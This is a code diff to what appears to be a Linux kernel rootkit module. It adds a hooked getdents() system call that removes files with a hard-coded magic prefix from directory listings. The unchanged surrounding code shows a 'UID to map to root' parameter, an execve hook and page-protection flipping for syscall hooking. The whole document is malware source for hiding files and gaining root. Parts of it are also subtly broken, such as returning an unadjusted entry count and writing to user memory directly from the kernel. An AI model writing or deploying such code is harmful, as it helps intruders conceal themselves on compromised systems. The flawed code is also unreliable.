@@ -43,7 +43,11 @@ MODULE_PARM_DESC(root_uid, "UID to map to root");
  * Files that start with a prefix matching magic_prefix are removed from the
  * linux_dirent64* buffer that is returned to the caller of getdents()
  */
-static char* magic_prefix;
+static char* magic_prefix = "foo";
+// TODO Pass this in dynamically, using below
+// Below currently doesn't work because it triggers a compiler error
+//module_param(magic_prefix, charp, "$sys$");
+//MODULE_PARM_DESC(magic_prefix, "Magic prefix for hiding files with getdents()");
 
 /*
  * RW/RO page flip code borrowed from Cormander's TPE-LKM code.
@@ -304,15 +308,21 @@ asmlinkage int new_execve(const char *filename, char *const argv[],
   return orig_func(filename, argv, envp);
 }
 
+int starts_with(const char *prefix, const char *str)
+{
+  return strncmp(prefix, str, strlen(prefix)) == 0;
+}
+
 asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp,
                             unsigned int count)
 {
   int (*orig_func)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
   t_syscall_hook *getdents_hook;
   int nread = 0;
-  unsigned int bpos = 0;
+  unsigned int bpos = 0, i = 0, j = 0;
   struct linux_dirent *d = NULL;
-  char *buf = (char *) dirp;
+  char *user_buf = (char *) dirp;
+  char starts_with_prefix = 0;
 
   printk(KERN_ALERT "getdents() hook invoked for %s.\n", current->comm);
 
@@ -325,10 +335,34 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp,
     return nread;
   }
 
+#pragma GCC diagnostic ignored "-Wdeclaration-after-statement"
+  char k_buf[count];
+#pragma GCC diagnostic pop
+
+  // Fill k_buf with 0x00 bytes
+  for (i = 0; i < count; ++i) {
+    k_buf[i] = 0x00;
+  }
+
   for (bpos = 0; bpos < (unsigned int)nread;) {
-    d = (struct linux_dirent *) (buf + bpos);
-    printk(KERN_ALERT "entry: %s\n", d->d_name);
+    d = (struct linux_dirent *) (user_buf + bpos);
+    starts_with_prefix = starts_with(magic_prefix, d->d_name);
+
+    printk(KERN_ALERT "entry: %s%s\n", d->d_name,
+           starts_with_prefix ? " (hidden)" : "");
+
+    if (!starts_with_prefix) {
+      for (i = bpos; i < bpos + d->d_reclen; ++i) {
+        k_buf[j++] = user_buf[i];
+      }
+    }
+
     bpos += d->d_reclen;
+  }
+
+  // Copy k_buf to user_buf - user_buf == dirp
+  for (i = 0; i < count; ++i) {
+    user_buf[i] = k_buf[i];
   }
 
   return nread;
